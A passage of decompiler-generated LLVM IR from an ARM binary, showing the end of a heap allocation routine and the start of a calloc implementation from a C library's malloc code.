  store i32 %v1_12ca8, i32* %r0.global-to-local, align 4
  %v3_12cac = icmp eq i32 %v1_12ca8, -1
  br i1 %v3_12cac, label %dec_label_pc_12cb4, label %dec_label_pc_12cc4

dec_label_pc_12cb4:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12cb8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12cb8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12d1c

dec_label_pc_12cc4:                               ; preds = %bb167
  %v1_12cc4 = load i32, i32* @r4, align 4
  %v3_12cc4 = icmp ult i32 %v1_12ca8, %v1_12cc4
  br i1 %v3_12cc4, label %dec_label_pc_12ccc, label %dec_label_pc_12d1c

dec_label_pc_12ccc:                               ; preds = %dec_label_pc_12cc4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r0.global-to-local, align 4
  %v4_12cd4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_12cd4, i32* %r2.global-to-local, align 4
  %v1_12cd8 = add i32 %v4_12cd4, 864
  %v2_12cd8 = inttoptr i32 %v1_12cd8 to i32*
  %v3_12cd8 = load i32, i32* %v2_12cd8, align 4
  %v0_12cdc = load i32, i32* @r6, align 4
  store i32 %v0_12cdc, i32* %r0.global-to-local, align 4
  %v1_12ce0 = and i32 %v3_12cd8, -2
  store i32 %v1_12ce0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_12ce0, i32* %v2_12cd8, align 4
  br label %dec_label_pc_12d1c

dec_label_pc_12cf0:                               ; preds = %.thread43
  %v0_12cf0 = load i32, i32* %r0.global-to-local, align 4
  %v3_12cf0 = icmp eq i32 %v0_12cf0, -1
  br i1 %v3_12cf0, label %dec_label_pc_12cf8, label %dec_label_pc_12d14

dec_label_pc_12cf8:                               ; preds = %dec_label_pc_12cf0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12cfc = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12cfc, i32* %r0.global-to-local, align 4
  %v0_12d00 = load i32, i32* @r7, align 4
  %v1_12d00 = add i32 %v0_12d00, 872
  %v2_12d00 = inttoptr i32 %v1_12d00 to i32*
  %v3_12d00 = load i32, i32* %v2_12d00, align 4
  store i32 %v3_12d00, i32* %r2.global-to-local, align 4
  %v0_12d04 = load i32, i32* @r4, align 4
  %v0_12d08 = load i32, i32* @r5, align 4
  %v2_12d04 = add i32 %v3_12d00, %v1_12cfc
  %v2_12d08 = sub i32 %v2_12d04, %v0_12d04
  %v2_12d0c = sub i32 %v2_12d08, %v0_12d08
  store i32 %v2_12d0c, i32* %r3.global-to-local, align 4
  store i32 %v2_12d0c, i32* %v2_12d00, align 4
  %v0_12d18.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12d14

dec_label_pc_12d14:                               ; preds = %dec_label_pc_12cf0, %dec_label_pc_12cf8
  %v0_12d18 = phi i32 [ 0, %dec_label_pc_12cf0 ], [ %v0_12d18.pre, %dec_label_pc_12cf8 ]
  %v0_12d14 = load i32, i32* @r4, align 4
  store i32 %v0_12d14, i32* @r7, align 4
  store i32 %v0_12d18, i32* @r5, align 4
  br label %dec_label_pc_12d1c

dec_label_pc_12d1c:                               ; preds = %dec_label_pc_12cc4, %dec_label_pc_12ccc, %dec_label_pc_12cb4, %dec_label_pc_12d14
  %v0_12d1c = load i32, i32* %r0.global-to-local, align 4
  %v7_12d1c = icmp eq i32 %v0_12d1c, -1
  br i1 %v7_12d1c, label %dec_label_pc_12da0, label %dec_label_pc_12d24

dec_label_pc_12d24:                               ; preds = %dec_label_pc_12d1c
  %v1_12d24 = load i32, i32* @r5, align 4
  %v2_12d24 = add i32 %v1_12d24, %v0_12d1c
  %v0_12d28 = load i32, i32* @r7, align 4
  %v2_12d28 = sub i32 %v2_12d24, %v0_12d28
  %v1_12d2c = or i32 %v2_12d28, 1
  %v2_12d30 = add i32 %v0_12d28, 4
  %v3_12d30 = inttoptr i32 %v2_12d30 to i32*
  store i32 %v1_12d2c, i32* %v3_12d30, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12d3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_12d3c, i32* @r6, align 4
  %v1_12d40 = add i32 %v4_12d3c, 872
  %v2_12d40 = inttoptr i32 %v1_12d40 to i32*
  %v3_12d40 = load i32, i32* %v2_12d40, align 4
  %v0_12d44 = load i32, i32* @r8, align 4
  %v2_12d44 = icmp eq i32 %v0_12d44, 0
  %v0_12d48 = load i32, i32* @r5, align 4
  %v2_12d48 = add i32 %v0_12d48, %v3_12d40
  store i32 %v2_12d48, i32* %r3.global-to-local, align 4
  store i32 %v2_12d48, i32* %v2_12d40, align 4
  %v0_12d50 = load i32, i32* @r7, align 4
  %v1_12d50 = load i32, i32* @r6, align 4
  %v2_12d50 = add i32 %v1_12d50, 44
  %v3_12d50 = inttoptr i32 %v2_12d50 to i32*
  store i32 %v0_12d50, i32* %v3_12d50, align 4
  br i1 %v2_12d44, label %dec_label_pc_12da0, label %dec_label_pc_12d58

dec_label_pc_12d58:                               ; preds = %dec_label_pc_12d24
  %v0_12d5c = load i32, i32* @r8, align 4
  %v1_12d5c = add i32 %v0_12d5c, -12
  %v1_12d60 = and i32 %v1_12d5c, -8
  store i32 %v3_12b28, i32* %ip.global-to-local, align 4
  %v2_12d68 = add i32 %v1_12d60, %v3_12b28
  store i32 %v2_12d68, i32* %r1.global-to-local, align 4
  %v2_12d6c = icmp ugt i32 %v1_12d60, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_12d74 = or i32 %v1_12d60, 1
  store i32 %v1_12d74, i32* %r3.global-to-local, align 4
  store i32 %v1_12d74, i32* %v2_12b34, align 4
  %v0_12d7c = load i32, i32* %r2.global-to-local, align 4
  %v1_12d7c = load i32, i32* %r1.global-to-local, align 4
  %v2_12d7c = add i32 %v1_12d7c, 8
  %v3_12d7c = inttoptr i32 %v2_12d7c to i32*
  store i32 %v0_12d7c, i32* %v3_12d7c, align 4
  %v0_12d80 = load i32, i32* %r2.global-to-local, align 4
  %v1_12d80 = load i32, i32* %r1.global-to-local, align 4
  %v2_12d80 = add i32 %v1_12d80, 4
  %v3_12d80 = inttoptr i32 %v2_12d80 to i32*
  store i32 %v0_12d80, i32* %v3_12d80, align 4
  br i1 %v2_12d6c, label %dec_label_pc_12d88, label %dec_label_pc_12da0

dec_label_pc_12d88:                               ; preds = %dec_label_pc_12d58
  %v0_12d88 = load i32, i32* @r6, align 4
  %v1_12d88 = add i32 %v0_12d88, 836
  %v2_12d88 = inttoptr i32 %v1_12d88 to i32*
  %v3_12d88 = load i32, i32* %v2_12d88, align 4
  store i32 %v3_12d88, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_12d90 = load i32, i32* %ip.global-to-local, align 4
  %v1_12d90 = add i32 %v0_12d90, 8
  store i32 %v1_12d90, i32* @r0, align 4
  store i32 -1, i32* %v2_12d88, align 4
  %v0_12d98 = call i32 @free()
  store i32 %v0_12d98, i32* %r0.global-to-local, align 4
  %v0_12d9c = load i32, i32* @r4, align 4
  %v1_12d9c = load i32, i32* @r6, align 4
  %v2_12d9c = add i32 %v1_12d9c, 836
  %v3_12d9c = inttoptr i32 %v2_12d9c to i32*
  store i32 %v0_12d9c, i32* %v3_12d9c, align 4
  br label %dec_label_pc_12da0

dec_label_pc_12da0:                               ; preds = %.thread37, %dec_label_pc_12d58, %dec_label_pc_12d24, %dec_label_pc_12d1c, %dec_label_pc_12d88
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r0.global-to-local, align 4
  %v4_12da8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_12da8, i32* %lr.global-to-local, align 4
  %v1_12dac = add i32 %v4_12da8, 872
  store i32 %v1_12dac, i32* %r1.global-to-local, align 4
  %v1_12db0 = inttoptr i32 %v1_12dac to i32*
  %v2_12db0 = load i32, i32* %v1_12db0, align 4
  store i32 %v2_12db0, i32* %r1.global-to-local, align 4
  %v3_12db0 = add i32 %v4_12da8, 876
  %v4_12db0 = inttoptr i32 %v3_12db0 to i32*
  %v5_12db0 = load i32, i32* %v4_12db0, align 4
  store i32 %v5_12db0, i32* %r3.global-to-local, align 4
  %v1_12db8 = add i32 %v4_12da8, 868
  %v2_12db8 = inttoptr i32 %v1_12db8 to i32*
  %v3_12db8 = load i32, i32* %v2_12db8, align 4
  store i32 %v3_12db8, i32* %r3.global-to-local, align 4
  %v1_12dbc = add i32 %v4_12da8, 884
  %v2_12dbc = inttoptr i32 %v1_12dbc to i32*
  %v3_12dbc = load i32, i32* %v2_12dbc, align 4
  store i32 %v3_12dbc, i32* %r2.global-to-local, align 4
  %v2_12dc0 = add i32 %v3_12db8, %v2_12db0
  store i32 %v2_12dc0, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_12db0, %v5_12db0
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_12da0
  store i32 %v2_12db0, i32* %v4_12db0, align 4
  %v0_12dc8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12dc8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_12da0, %bb168
  %v1_12dc8 = phi i32 [ %v3_12dbc, %dec_label_pc_12da0 ], [ %v1_12dc8.pre, %bb168 ]
  %v4_12dcc = phi i32 [ %v2_12dc0, %dec_label_pc_12da0 ], [ %v0_12dc8.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_12dcc, %v1_12dc8
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_12dcc = load i32, i32* %lr.global-to-local, align 4
  %v6_12dcc = add i32 %v5_12dcc, 884
  %v7_12dcc = inttoptr i32 %v6_12dcc to i32*
  store i32 %v4_12dcc, i32* %v7_12dcc, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_12dd0 = load i32, i32* %lr.global-to-local, align 4
  %v1_12dd0 = add i32 %v0_12dd0, 44
  %v2_12dd0 = inttoptr i32 %v1_12dd0 to i32*
  %v3_12dd0 = load i32, i32* %v2_12dd0, align 4
  store i32 %v3_12dd0, i32* %ip.global-to-local, align 4
  %v1_12dd4 = add i32 %v3_12dd0, 4
  %v2_12dd4 = inttoptr i32 %v1_12dd4 to i32*
  %v3_12dd4 = load i32, i32* %v2_12dd4, align 4
  store i32 %v1_129e8, i32* %r1.global-to-local, align 4
  %v1_12ddc = and i32 %v3_12dd4, -4
  store i32 %v1_12ddc, i32* %r3.global-to-local, align 4
  %v3_12de0 = icmp ult i32 %v1_12ddc, %v1_129e8
  br i1 %v3_12de0, label %dec_label_pc_12e0c, label %dec_label_pc_12de8

dec_label_pc_12de8:                               ; preds = %bb171
  %v0_12de8 = load i32, i32* @sl, align 4
  %v2_12de8 = sub i32 %v1_12ddc, %v0_12de8
  %v2_12dec = add i32 %v0_12de8, %v3_12dd0
  store i32 %v2_12dec, i32* %r1.global-to-local, align 4
  %v1_12df0 = or i32 %v2_12de8, 1
  store i32 %v1_12df0, i32* %r3.global-to-local, align 4
  %v1_12df4 = or i32 %v0_12de8, 1
  store i32 %v1_12df4, i32* %r2.global-to-local, align 4
  %v1_12df8 = add i32 %v3_12dd0, 8
  store i32 %v1_12df8, i32* %r0.global-to-local, align 4
  store i32 %v1_12df4, i32* %v2_12dd4, align 4
  %v0_12e00 = load i32, i32* %r1.global-to-local, align 4
  %v1_12e00 = load i32, i32* %lr.global-to-local, align 4
  %v2_12e00 = add i32 %v1_12e00, 44
  %v3_12e00 = inttoptr i32 %v2_12e00 to i32*
  store i32 %v0_12e00, i32* %v3_12e00, align 4
  %v0_12e04 = load i32, i32* %r3.global-to-local, align 4
  %v1_12e04 = load i32, i32* %r1.global-to-local, align 4
  %v2_12e04 = add i32 %v1_12e04, 4
  %v3_12e04 = inttoptr i32 %v2_12e04 to i32*
  store i32 %v0_12e04, i32* %v3_12e04, align 4
  br label %dec_label_pc_12e24

dec_label_pc_12e0c:                               ; preds = %bb160, %bb171, %dec_label_pc_12be8
  store i32 62584, i32* %r3.global-to-local, align 4
  %v0_12e10 = call i32 @__aeabi_read_tp()
  %v3_12e14 = load i16, i16* @global_var_22294.357, align 2
  %v4_12e14 = sext i16 %v3_12e14 to i32
  store i32 %v4_12e14, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_12e1c = add i32 %v4_12e14, %v0_12e10
  %v4_12e1c = inttoptr i32 %v3_12e1c to i32*
  store i32 12, i32* %v4_12e1c, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12e24

dec_label_pc_12e24:                               ; preds = %bb154, %bb153, %dec_label_pc_12de8, %dec_label_pc_12a30, %dec_label_pc_12e0c
  %v0_12e24 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12e24, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e28

dec_label_pc_12e28:                               ; preds = %.thread4, %dec_label_pc_129fc, %.thread124, %dec_label_pc_1286c, %dec_label_pc_12860, %dec_label_pc_126c8, %dec_label_pc_1264c, %dec_label_pc_12e24
  store i32 %v2_1256c, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r2.global-to-local, align 4
  %v4_12e38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 44) to i32*), align 4
  store i32 %v4_12e38, i32* @ip, align 4
  store i32 77380, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12e38)
  br label %dec_label_pc_12e44

dec_label_pc_12e44:                               ; preds = %dec_label_pc_125a4, %dec_label_pc_12e28
  %v0_12e44 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12e44, i32* %r0.global-to-local, align 4
  store i32 %v3_12540, i32* @r4, align 4
  store i32 %v6_12540, i32* @r5, align 4
  store i32 %v9_12540, i32* @r6, align 4
  store i32 %v12_12540, i32* @r7, align 4
  store i32 %v15_12540, i32* @r8, align 4
  store i32 %v18_12540, i32* @sb, align 4
  store i32 %v21_12540, i32* @sl, align 4
  store i32 %v24_12540, i32* @fp, align 4
  store i32 %v27_12540, i32* @lr, align 4
  ret i32 %v0_12e44

; uselistorder directives
  uselistorder i32 %v0_12de8, { 1, 0, 2 }
  uselistorder i32 %v3_12dd0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12dcc, { 1, 0 }
  uselistorder i32 %v2_12db0, { 2, 0, 1, 3 }
  uselistorder i32 %v4_12da8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_12d60, { 1, 2, 0 }
  uselistorder i32 %v0_12d28, { 1, 0 }
  uselistorder i32 %v0_12d1c, { 1, 0 }
  uselistorder i32 %v2_12d0c, { 1, 0 }
  uselistorder i32 %v2_12c9c, { 2, 1, 0 }
  uselistorder i32 %v2_12c84, { 1, 2, 0, 3 }
  uselistorder i32 %v2_12c7c, { 1, 0, 2 }
  uselistorder i32 %v1_12c78, { 2, 1, 0 }
  uselistorder i32 %v0_12c78, { 3, 1, 2, 0 }
  uselistorder i32 %v1_12c5c, { 1, 0 }
  uselistorder i32 %v2_12c34, { 1, 0 }
  uselistorder i32 %v3_12c28, { 1, 0, 2 }
  uselistorder i32 %v2_12c08, { 1, 0, 2 }
  uselistorder i32* %v2_12c00, { 1, 0, 2 }
  uselistorder i32 %v0_12be8, { 1, 0 }
  uselistorder i32 %v6_12bc4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12bb0, { 2, 1, 0 }
  uselistorder i32 %v0_12b98, { 1, 0 }
  uselistorder i32 %v2_12b54, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12b50, { 1, 0 }
  uselistorder i32 %v3_12b28, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_12b08, { 1, 0, 2 }
  uselistorder i32 %v2_12af0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12a98, { 2, 1, 0 }
  uselistorder i32 %v6_12a8c, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_12a68, { 2, 1, 0, 3 }
  uselistorder i32 %v3_12a28, { 1, 0, 2, 3 }
  uselistorder i32 %v0_129e8, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_129e0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_129dc, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_129c8, { 1, 0 }
  uselistorder i32 %v7_12988, { 1, 0 }
  uselistorder i32 %v4_12988, { 1, 0 }
  uselistorder i32 %v0_12958, { 1, 0 }
  uselistorder i32 %v2_1292c, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_1292857, { 1, 0 }
  uselistorder i32 %v1_128f4, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_128dc., { 1, 2, 0 }
  uselistorder i32 %v0_128e4, { 0, 1, 3, 2 }
  uselistorder i32 %v1_128e4, { 1, 0 }
  uselistorder i32 %v3_128c4, { 1, 0 }
  uselistorder i32 %v4_128c0, { 1, 0, 2 }
  uselistorder i32 %v1_12830, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12888, { 1, 0 }
  uselistorder i32 %v1_1286c, { 1, 0 }
  uselistorder i32 %v1_1270c, { 1, 0 }
  uselistorder i32 %v0_1284c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_12814, { 2, 0, 1, 3 }
  uselistorder i32 %v0_128a8.pre, { 1, 2, 0 }
  uselistorder i32 %v0_127f0, { 2, 1, 0 }
  uselistorder i32 %v3_127e4, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_12704, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_127ac, { 1, 0 }
  uselistorder i32 %v3_127a0, { 1, 0 }
  uselistorder i32 %v0_127ac, { 1, 0 }
  uselistorder i32 %v3_12784, { 0, 2, 3, 1 }
  uselistorder i32 %v2_12774, { 1, 0, 2 }
  uselistorder i32 %v3_1272c, { 2, 1, 0 }
  uselistorder i32 %v0_1271c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_126ec, { 1, 0 }
  uselistorder i32 %v1_126a0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1269c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_12640, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_12634, { 1, 0 }
  uselistorder i32 %v3_12604, { 1, 0 }
  uselistorder i32 %v0_125f8, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_125d8, { 0, 2, 1, 3 }
  uselistorder i1 %v7_125cc, { 1, 0 }
  uselistorder i32 %v0_1259c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 42, 39, 40, 41, 43, 44, 45, 46, 109, 110, 47, 48, 49, 50, 51, 52, 53, 54, 55, 60, 56, 57, 58, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 80, 88, 75, 76, 77, 78, 79, 81, 82, 83, 84, 108, 85, 86, 87, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 34, 30, 31, 0, 32, 33, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_12e44, { 1, 0 }
  uselistorder label %dec_label_pc_12e28, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_12e24, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_12e0c, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_12da0, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12d1c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_12d14, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_12be8, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_12b1c, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_129d4, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_12928, { 1, 0 }
  uselistorder label %dec_label_pc_12930.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_128f4, { 1, 0 }
  uselistorder label %dec_label_pc_128a8, { 1, 0 }
  uselistorder label %dec_label_pc_1283c, { 1, 0 }
  uselistorder label %dec_label_pc_12838, { 1, 0 }
  uselistorder label %dec_label_pc_127e4, { 1, 0 }
  uselistorder label %dec_label_pc_127d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12798, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12784, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_12e58(i32 %arg1) local_unnamed_addr {
dec_label_pc_12e58:
  %v0_12e58 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12e58, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_12e58
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12e58, %bb
  %v4_12e74 = phi i32 [ %arg1, %dec_label_pc_12e58 ], [ 0, %bb ]
  ret i32 %v4_12e74

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_12e78 = load i32, i32* @r4, align 4
  %v6_12e78 = load i32, i32* @r5, align 4
  %v9_12e78 = load i32, i32* @r6, align 4
  %v12_12e78 = load i32, i32* @lr, align 4
  %v2_12e80 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_12e90 = mul i32 %arg2, %arg1
  store i32 %v2_12e90, i32* @r6, align 4
  br i1 %v2_12e80, label %dec_label_pc_12ec8, label %dec_label_pc_12e98

dec_label_pc_12e98:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_12ea0 = udiv i32 %v2_12e90, %arg1
  %v9_12ea4 = icmp eq i32 %v2_12ea0, %arg2
  br i1 %v9_12ea4, label %dec_label_pc_12ec8, label %dec_label_pc_12eac

dec_label_pc_12eac:                               ; preds = %dec_label_pc_12e98
  %v0_12eb0 = call i32 @__aeabi_read_tp()
  %v3_12eb4 = load i16, i16* @global_var_22294.357, align 2
  %v4_12eb4 = sext i16 %v3_12eb4 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_12ec0 = add i32 %v4_12eb4, %v0_12eb0
  %v4_12ec0 = inttoptr i32 %v3_12ec0 to i32*
  store i32 12, i32* %v4_12ec0, align 4
  br label %dec_label_pc_12f8c

dec_label_pc_12ec8:                               ; preds = %dec_label_pc_12e98, %entry
  %v4_12ecc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 108) to i32*), align 4
  store i32 %v4_12ecc, i32* @r4, align 4
  %v4_12ee4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 112) to i32*), align 4
  store i32 %v4_12ee4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12ee4)
  %v0_12ef8 = load i32, i32* @r5, align 4
  %v2_12ef8 = add i32 %v0_12ef8, 16
  %v3_12ef8 = inttoptr i32 %v2_12ef8 to i32*
  %v4_12ef8 = load i32, i32* %v3_12ef8, align 4
  store i32 %v4_12ef8, i32* %ip.global-to-local, align 4
  store i32 77572, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12ef8)
  %v0_12f04 = load i32, i32* @r6, align 4
  store i32 %v0_12f04, i32* @r0, align 4
  %v0_12f08 = call i32 @malloc()
  store i32 %v0_12f08, i32* %r4.global-to-local, align 4
  %v2_12f0c = icmp eq i32 %v0_12f08, 0
  br i1 %v2_12f0c, label %.thread, label %dec_label_pc_12f14

dec_label_pc_12f14:                               ; preds = %dec_label_pc_12ec8
  %v1_12f14 = add i32 %v0_12f08, -4
  %v2_12f14 = inttoptr i32 %v1_12f14 to i32*
  %v3_12f14 = load i32, i32* %v2_12f14, align 4
  %v1_12f18 = and i32 %v3_12f14, 2
  %v2_12f18 = icmp eq i32 %v1_12f18, 0
  br i1 %v2_12f18, label %dec_label_pc_12f20, label %.thread

dec_label_pc_12f20:                               ; preds = %dec_label_pc_12f14
  %v1_12f206 = add i32 %v3_12f14, -4
  %v1_12f24 = and i32 %v1_12f206, -4
  %v3_12f28 = udiv i32 %v1_12f24, 4
  store i32 %v3_12f28, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_12f24, 36
  %v2_12f30 = icmp ult i32 %v1_12f24, 33
  %v3_12f30 = or i1 %tmp, %v2_12f30
  br i1 %v3_12f30, label %dec_label_pc_12f3c, label %dec_label_pc_12f34

dec_label_pc_12f34:                               ; preds = %dec_label_pc_12f20
  %v3_12f34 = inttoptr i32 %v0_12f08 to i8*
  %v4_12f34 = call i32 @__GI_memset(i8* %v3_12f34, i32 0, i32 %v1_12f24)
  br label %.thread

dec_label_pc_12f3c:                               ; preds = %dec_label_pc_12f20
  %tmp7 = icmp eq i32 %v1_12f24, 16
  %v2_12f40 = inttoptr i32 %v0_12f08 to i32*
  store i32 0, i32* %v2_12f40, align 4
  %v1_12f44 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f44 = add i32 %v1_12f44, 4
  %v3_12f44 = inttoptr i32 %v2_12f44 to i32*
  store i32 0, i32* %v3_12f44, align 4
  %v1_12f48 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f48 = add i32 %v1_12f48, 8
  %v3_12f48 = inttoptr i32 %v2_12f48 to i32*
  store i32 0, i32* %v3_12f48, align 4
  %v2_12f4c = icmp ult i32 %v1_12f24, 13
  %v3_12f4c = or i1 %tmp7, %v2_12f4c
  br i1 %v3_12f4c, label %.thread, label %dec_label_pc_12f50

dec_label_pc_12f50:                               ; preds = %dec_label_pc_12f3c
  %v0_12f50 = load i32, i32* %ip.global-to-local, align 4
  %v1_12f54 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f54 = add i32 %v1_12f54, 12
  %v3_12f54 = inttoptr i32 %v2_12f54 to i32*
  store i32 0, i32* %v3_12f54, align 4
  %v1_12f58 = load i32, i32* %r4.global-to-local, align 4
